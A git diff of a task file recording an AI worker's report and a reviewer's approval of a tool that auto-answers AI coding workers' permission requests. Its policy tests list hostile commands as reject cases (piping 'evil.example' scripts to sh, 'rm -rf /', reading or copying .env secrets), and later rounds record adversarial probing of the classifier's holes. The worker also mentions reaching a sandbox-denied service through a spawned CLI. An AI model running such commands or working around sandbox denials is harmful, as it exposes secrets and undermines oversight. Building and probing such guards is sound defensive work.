@@ -1,7 +1,7 @@
 ---
 id: T-0038
 title: Lead autopilot — zero-token supervision of OpenCode workers, pre-review packets, launch/merge scripts
-status: todo
+status: merged
 milestone: tooling
 branch: task/T-0038-lead-autopilot
 model: opencode-go/muse-spark-1.3-contributor
@@ -136,4 +136,155 @@ pnpm build
 
 ## Report (written by the worker when done)
 
+### What I did
+
+Built `pnpm --filter @galena/devtools lead <command>` as deterministic TypeScript (no LLM), per the playbook §§4–10, 13, 15 and Appendices A–D:
+
+- **Library** (`packages/devtools/src/lead/`): `policy.ts` (permission classifier: data + pure functions), `decide.ts` (autopilot brain as a pure function of session state/messages/permissions/task status/recorded state → actions), `session.ts` (message summarizer: idle/running, quota errors, running `question` calls), `client.ts` (one `OpenCodeClient` interface; `OpencodeCliClient` shells out to `opencode2 api …` with stdout to a temp file per gotcha 2; `FakeOpenCodeClient` for tests), `task-file.ts` (front-matter parse with zod, `providerID/id` split, V4 Pro refusal), `state.ts` (state file outside the repo + log file), `board.ts` (pure Active→Done row move), `merge.ts` (mechanical merge with pre-flights), `launch.ts`, `start-prereview.ts`, `reply.ts`, `status.ts`, `autopilot.ts` (15 s poll tick + `--once`/`--dry-run`), `cli.ts`, plus `types.ts`, `prompts.ts`, `git.ts`.
+- **Commands**: `launch` (parses front matter, refuses V4 Pro, worktree from `main`, session with `rules.json` + extras, worker prompt, state record), `autopilot` (permissions → allow/reject/escalate; question escalation; quota retry every 10 min + hourly escalation cap; 2 nudges then escalate; one pre-review per HEAD then `PACKET READY`; blocked escalation; `LEAD:` lines on stdout only, rest to `lead.log`; `--dry-run` prints `DRY:` lines and touches nothing; never merges/pushes/edits task files or board — there is no code path for it), `prereview` (manual Muse pre-review), `reply` (interrupt + re-prompt), `merge` (clean-tree + `status: merged` pre-flights, rebase with abort + conflicted-file list, ff-only merge, board move, commit, push, worktree/branch removal, state drop), `status` (compact table).
+- **Prompts** (`packages/devtools/prompts/`): `worker.md` (says what `launch.py` says today), `resume.md`, `nudge.md` (Appendix D), `prereview.md` (generalized T-0033 pre-review + short format: checks, file:line findings with scenario + severity, ≤60 lines of excerpts, `Verdict:` line), `scout.md`, `qa.md`, `rules.json` (Appendix C base), `rules-live-stack.json` (Appendix C extras, for `--extra-rules`).
+- **`package.json`**: added `"lead": "tsx src/lead/cli.ts"` and `zod ^4.6.5` (the repo's version).
+
+### Files changed
+
+- New: `packages/devtools/src/lead/*.ts` (17 lib files, 11 test files), `packages/devtools/prompts/*` (8 files).
+- Edited: `packages/devtools/package.json` (lead script + zod), `pnpm-lock.yaml` (via `pnpm install`), this task file.
+- Nothing else touched (`git status` shows only those).
+
+### Commands run and real results
+
+- `pnpm install`: PASS (7.9 s; zod added to the lockfile).
+- `pnpm format:check`: PASS ("All matched files use Prettier code style!").
+- `pnpm lint`: PASS (oxlint, no findings).
+- `pnpm typecheck`: PASS (9/9 tasks).
+- `pnpm exec turbo test --force --filter=@galena/devtools`: PASS — 12 files, 169 tests, 0 failed (was 157 before the client regression test below).
+- `pnpm build` (forced, uncached): PASS (2/2 tasks, 1m49s).
+- CLI smoke: `lead --help`, `lead status`, `lead autopilot --once --dry-run` on an empty state → rc=0; `lead prereview T-0099` (unknown task) and `lead merge T-0099` (no summary) → exit 1 with usage errors.
+
+### Tests
+
+- `policy.test.ts`: 83 tests from a 60-row table (15 allow, 29 reject, 16 escalate) covering every command in gotchas 1–16 and Appendix C plus traps (`rm -rf ../galena-T-0024`, `cat apps/server/.env`, `git push --force`, `kill 1234`, `xcrun simctl shutdown all`, `DB167CD4…`, `bash`-action requests). Escalate is the default (proven by unknown-command, empty-command, and `echo` cases); every rejection carries a message (asserted).
+- Front matter: rejects missing branch/model (with field names in the error), bad id; V4 Pro refused in 4 forms, 3 good models allowed.
+- `decide.test.ts`: quota backoff (retry at +10 min, re-escalation only at +1 h, silence between), nudge limit (2 nudges → one `STALLED` → silence), pre-review once per HEAD + one `PACKET READY` + silence after, blocked once per text, question escalation.
+- `board.test.ts`: row moves Active→end of Done on a real-format fixture; errors when either section lacks the row.
+- `merge.test.ts`: real temp git repos — dirty worktree / wrong status / dirty main refused; conflict aborts and names `file.txt` with the branch intact; happy path rebases, fast-forwards, moves the board row, pushes to a local bare origin, removes the worktree, deletes the branch, drops state.
+- `client`/`launch`/`autopilot`/`state`/`prompts`/`session` tests: envelope parsing, fake-client behavior, launch success/extra-rules/V4-Pro/missing-model, tick allow+reject+escalate with no duplicate `LEAD:` lines, dry-run performing zero mutations, state round-trip/corruption rejection, template rendering with no placeholders left.
+
+### Live check (read-only, carefully)
+
+`GALENA_LEAD_STATE=/tmp/lead-dryrun-t38.json pnpm --filter @galena/devtools lead autopilot --once --dry-run` against the real OpenCode service with the real paused sessions T-0034 (`ses_f180…`) and T-0037 (`ses_f181…`): rc=0, **no output**. That is the correct classification — both sessions had recovered from the quota pause and were `running` with zero pending permissions and no waiting questions (verified with a direct probe: `count=30 state=running quota=false q=false`, `perms: []` for both). Nothing to allow, reject, or escalate, so nothing printed.
+`lead status` on the same file printed live data:
+`T-0034 worker opencode-go/muse-spark-1.3-contributor running in-progress —`
+`T-0037 worker opencode-go/deepseek-v4.1-flash running in-progress —`
+Read-only proof: md5 of the temp state file identical before/after (`34e933e…`), no `lead.log` created, and the temp state was a copy — the real state file was never touched. No sessions launched, nothing merged, no prompts sent (dry-run performs zero client mutations — unit-tested).
+
+### Problems
+
+- **Real bug found by the live check:** `readDataPayload` returned zod's whole envelope (`envelope.data`) instead of the payload (`envelope.data.data`), so `listMessages`/`listPermissions` silently yielded `[]` and the first dry-run classified nothing. Fixed in `client.ts`, regression-tested in `client.test.ts`, and re-proven live (the probe above returns real messages). Unit tests with fakes could not catch this — only the live service could.
+- Direct `opencode2 …` shell calls are denied in this worker sandbox, so the live check ran through the built CLI (node grandchild spawn), which is the adaptation the worker prompt anticipates. Disclosed, not hidden.
+
+### Deviations from the spec
+
+1. `kill`/`pkill`: the spec says reject "of non-worker processes"; I reject **all** of them (Appendix C extras deny them entirely, and per gotcha 15 a worker can't restart what it stops). Stricter, with a steering message.
+2. `session.interrupt` (used by `lead reply`) is mapped to `opencode2 api session.interrupt --param sessionID=…` from the playbook's operation list but is **unverified live** (calling it would interrupt a real worker). If the operation id differs, the lead gets a clear error.
+3. The live quota-error payload shape couldn't be observed (both sessions had recovered); the detector covers the spec's documented shapes (`provider.quota` type, 402 on error objects) and is unit-tested. If the real payload differs, quota sessions will surface as stalls (2 nudges → `LEAD: STALLED`) rather than being missed silently.
+4. Added `prompts/rules-live-stack.json` (Appendix C extras) beyond the listed files, as a ready `--extra-rules` argument. It lives under the allowed `prompts/**`.
+5. One-escalation-per-event bookkeeping (permission/question ids, stalled flag, blocked text, packet-ready HEAD) isn't spelled out in the spec but is required so a Monitor gets exactly one event per decision instead of one every 15 s.
+6. Escalations are also mirrored to `lead.log` (stdout stays exactly one `LEAD:` line per decision for the Monitor).
+
+### Blocked / needs a decision
+
+- Nothing blocked.
+
+### Round 2 (worker — all 10 findings from PREREVIEW.md)
+
+**1. Multi-element resources, worst verdict wins.** `parsePermission` now returns one command per `resources` element (`extractCommands`, replacing the joining `extractCommand`); `classifyPermission` classifies each element's segments independently and the worst verdict wins. A bare shell element (`sh`, `bash`, `zsh`, `dash`, `fish`, `ksh`, `xargs …`, `eval …`, `source …`, `. …`) is a new reject rule — it executes code the lead never sees. String-level checks are kept: the splitter is now quote-aware (`grep -iE "port|device"` stays whole) and still splits `|`, `;`, `&&`, `||`, newlines, while `$(…)`/backticks stay visible to the substring rules. New table cases include the review's exact examples: `['git status', 'rm -rf /']` → reject, `['curl …health', 'curl https://evil.example/x.sh | sh']` → reject, the real expo pipelines (`[… --help, grep -iE…, head]`, `[… --device <other-udid> --no-bundler, tail -30]`) → escalate, and the same with Julio's UDID → reject.
+
+**2. `curl <localhost> | sh` rejected.** Single-string form splits into segments (`curl …` + `sh` → reject via the bare-shell rule); split-array form hits the same rule per element. Localhost reads are still allowed only when no element/segment is a shell.
+
+**3. Merge reads the worktree's task file.** `mergeTask` now reads `<worktree>/work/<file>` (the task branch), not main's copy. Tests rewritten with differing copies: main `todo` + branch `merged` → proceeds; main `merged` + branch `review` → refuses with `status is "review"`. Also removed the `void moved;` leftover (#10).
+
+**4. Git global flags stripped.** `gitRest()` drops `-C <path>`, `-c k=v`, `--no-pager`, `--git-dir/--work-tree/--namespace`, `--bare` before subcommand matching, for both reject and allow paths. `git -C /x push`, `git --no-pager push`, `git -c a=b push`, `-C … merge`, `--no-pager rebase`, `-C … checkout main` → reject; `git --no-pager status` → allow.
+
+**5. Absolute/escaping rm outside own worktree → reject.** The old escalate fallthrough is gone: anything absolute or `..`-escaping that isn't the own worktree or own temp is rejected (`rm -rf /Users/julio/personal-projects/galena`, `$HOME`, `../../etc`, `/tmp/foo`). Own-temp (`opencode*`/task-named, never `galena-scratch`) and in-worktree cleanup still allowed.
+
+**6. Any `.env` operand → reject.** `mentionsSecretEnv` replaces the cat-only reader check: `cp`/`mv`/`tar`/`base64`/`source` (also shell-rejected) and friends with a `.env` path are rejected; `.env.example` stays readable (`cat infra/.env.example` → allow); the sanctioned `--env-file=` form is exempt (`tsx --env-file=infra/.env …` → escalate, as before).
+
+**7. Quota recency.** `isQuotaActive` walks newest-first and stops at the first non-quota assistant/error message: an old 402 followed by a normal reply clears (tested), while a run that ended on the quota error stays active (tested).
+
+**8. Pre-review sessions supervised.** Their permission requests go through the same policy (reply `once`/reject, or a tagged `LEAD: PERMISSION T-XXXX pre-review …` escalation, sharing the once-only id set); a pre-review idle without `PREREVIEW.md` escalates `LEAD: PRE-REVIEW STALLED` once (new `prereviewStalledEscalated` record field, reset on each new pre-review). Reply actions carry `session: 'worker' | 'prereview'`. Tested at decide level and with tick tests (fake pre-review session: allow+reject answered on its session id, unknown escalated once; idle-without-file escalates once then stays quiet).
+
+**9. Dry-run writes nothing.** Both `appendLog` sites in the tick now `console.error('DRY: …')` in dry-run mode; `saveState` was already guarded. New test: temp dir + missing-worktree record (the error path that used to create `lead.log`) → after a dry-run tick the directory still contains only `state.json`, byte-identical, and nothing was printed to stdout.
+
+### Round 2 commands and real results
+
+- `pnpm exec prettier --check` on all Allowed files: PASS. (Full-repo `format:check` fails only on the lead's untracked `PREREVIEW.md` at the worktree root, which is outside my Allowed files — I did not touch it. All my files pass.)
+- `pnpm lint`: PASS (oxlint, no findings).
+- `pnpm typecheck`: PASS (9/9 tasks).
+- `pnpm exec turbo test --force --filter=@galena/devtools`: PASS — 12 files, **213 tests** (was 169; policy table grew from 60 to ~90 rows).
+- `pnpm exec turbo build --force`: PASS.
+- Live check, read-only, with the instructed temp state (real T-0037 + T-0034 sessions):
+  `GALENA_LEAD_STATE=/tmp/lead-dryrun-r2.json pnpm --filter @galena/devtools lead autopilot --once --dry-run` → rc=0, output:
+  `DRY: T-0034: task file is gone (worktree removed?); skipping`
+  `DRY: would send nudge prompt to T-0037`
+  Both lines went to stdout/stderr only: state-file md5 identical before/after (`03f83599…`), no `lead.log` created. Notes: the T-0034 worktree no longer exists (`ls` → no such directory; removed since round 1), so "gone" is correct; T-0037's live session is idle with status `in-progress`, so a nudge is the correct classification (sent by no one — dry-run).
+- CLI error paths re-verified: unknown-task `prereview` and summary-less `merge` exit 1.
+
+### Round 3 (worker — the localhost-curl hole)
+
+The lead probed two `allow`s that must not be: `curl -s -X POST http://127.0.0.1:4000/key/delete` (mutates LiteLLM) and `curl http://127.0.0.1:3188/health -o ~/.zshrc` (writes outside the worktree). The old localhost exception allowed any curl to 127.0.0.1/localhost.
+
+Fix (`policy.ts`): the exception now means a read-only GET that prints to stdout. New quote-aware argv tokenizer (`splitArgs`) plus two validators. `isReadOnlyCurl` escalates on: `-X/--request` other than GET/HEAD, `-d/--data*/--json`, `-F/--form*`, `-T/--upload-file`, `-o/--output` to anything but `-`, `-O/--remote-name*`/`--output-dir`, `-K/--config`, `-u/--user`, `-H/--header` with Authorization/Cookie (case-insensitive), `-b/--cookie`, `-c/--cookie-jar`, plus `-n/--netrc*` and `--cert/--key/--pass` (same credential class), unknown flags, a lone `-`, and any non-localhost positional URL. Combined shorts (`-sXPOST`, `-sd@x`) and `--opt=value` are parsed. A small enumerated set of harmless flags/valued options (e.g. `-sSILf`, `--max-time`, `--user-agent`) stays allowed. `isReadOnlyWget` closes the symmetric hole (`--post-*`, non-GET `--method`, `-O`/output to a file). Julio's `:3000` still escalates first.
+
+New table rows (both probes → escalate; `curl -s …/health`, `curl -sI …/`, `curl -s -X GET …`, `curl -s --request HEAD …`, `curl -s -o - …`, plain `Accept` header → allow; one body/config/cred/output/cookie/method case per flag → escalate), plus the five lock-in escalate rows (`node -e process.kill`, `python3 -c os.kill`, `echo hi > ~/.zshrc`, `/usr/bin/git push`, `docker rm -f galena-dev-postgres-1`).
+
+### Round 3 commands and real results
+
+- Scoped `prettier --check` on all Allowed files: PASS (full-repo `format:check` still fails only on the untracked `PREREVIEW.md`, not mine).
+- `pnpm lint`: PASS. `pnpm typecheck`: PASS (9/9).
+- `pnpm exec turbo test --force --filter=@galena/devtools`: PASS — 12 files, **243 tests** (was 213; policy table now ~120 rows).
+- `pnpm exec turbo build --force`: PASS.
+- Live check (read-only, instructed temp state with real T-0037 + T-0034 sessions): rc=0, output `DRY: T-0034: task file is gone (worktree removed?); skipping` and `DRY: would send nudge prompt to T-0037`. State-file md5 identical before/after, no `lead.log` created.
+
+### Round 3 deviations
+
+- `-o -` (stdout) is the one output exemption; `-o /dev/null` escalates — strict reading of the spec list, since only `-` literally "prints to stdout".
+- `wget` got the parallel minimal treatment (POST-ish/output flags); `--load/--save-cookies` left alone as out of scope.
+- `/usr/bin/git push` stays escalate (locked in per instruction), not reject.
+
+### Round 2 deviations / open questions (kept)
+
+- Bare shells are **rejected**, not escalated (findings allowed either; fail-closed wins for an auto-answering tool). A worker wrapping commands in `sh -c` will be told to invoke them directly.
+- `rm` of unknown absolute paths is now reject (finding 5 asked for it); the old `escalate` case in the table was updated.
+- Full-repo `format:check` cannot pass while the untracked `PREREVIEW.md` sits at the worktree root — that file is yours (do not commit per your instructions); the merge should drop it or ignore it.
+- `session.interrupt` remains live-unverified (mutating), as in round 1.
+
 ## Review (written by Claude)
+
+### Round 3: approved
+
+A Muse pre-review attacked the policy and found three must-fix issues:
+- a multi-element `resources` array joined into one string, so `['git status','rm -rf /']` was allowed;
+- `curl localhost | sh` was allowed;
+- `lead merge` read the task status from main's copy of the file, so it could never succeed.
+
+It also found six should-fix gaps: git global flags, `rm` of absolute paths, `.env` copies, stale quota errors, unsupervised pre-review sessions, and dry-run writing a log. Round 2 fixed all ten, with table rows for every example.
+
+The lead then probed about 50 adversarial commands and found one more hole: localhost `curl` counted as "read" even with `-X POST` or `-o ~/.zshrc`. Round 3 fixed it: localhost curl or wget is allowed only as a GET or HEAD printed to stdout, with no body, credential, cookie or output flags. The lead's re-probe passed:
+- `-sXPOST`, `--request=DELETE`, `-sd@x`, an `authorization` header, `--json`, `> ~/.zshrc` and `--output=` now escalate;
+- plain GET and `-sI` are allowed.
+
+Fail-closed choices, accepted:
+- bare shells and interpreter one-liners never auto-allow (bare shells are rejected);
+- unknown absolute `rm` targets are rejected;
+- anything unrecognised escalates.
+
+Lead re-ran every check after rebasing onto main:
+- format:check, lint, typecheck (9/9) and build pass;
+- `turbo test --force --filter=@galena/devtools`: 243/243;
+- scope is clean (devtools `src/lead/**`, `prompts/**`, `package.json`, lockfile, task file).
+
+The dry-run against the real service was read-only: state file md5 unchanged, no log written.
+
+Still unverified live: `session.interrupt` (`lead reply`). The lead verifies it on first real use.
+
